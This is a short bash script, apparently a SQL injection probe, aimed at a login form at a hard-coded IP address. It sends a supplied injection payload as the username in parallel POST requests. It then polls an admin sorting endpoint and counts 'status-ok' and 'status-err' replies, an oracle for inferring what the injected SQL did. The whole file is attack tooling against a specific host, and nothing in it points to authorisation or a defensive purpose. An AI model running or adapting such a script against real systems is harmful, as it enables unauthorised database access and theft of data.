#!/bin/bash
# Usage: sqli_probe.sh "<payload>" [writes] [reads]
PAYLOAD="$1"
WRITES="${2:-8}"
READS="${3:-8}"
BASE="http://43.200.51.235:8081/ops-status"

for i in $(seq 1 "$WRITES"); do
  curl -s -o /dev/null -X POST "$BASE/login" \
    --data-urlencode "username=$PAYLOAD" \
    --data-urlencode "password=x" --max-time 10 &
done
wait

OK=0
ERR=0
for i in $(seq 1 "$READS"); do
  R=$(curl -s "$BASE/admin/last-login-sort" --max-time 10)
  if echo "$R" | grep -q 'status-ok'; then
    OK=$((OK+1))
  elif echo "$R" | grep -q 'status-err'; then
    ERR=$((ERR+1))
  fi
done
echo "PAYLOAD=[$PAYLOAD] OK=$OK ERR=$ERR"
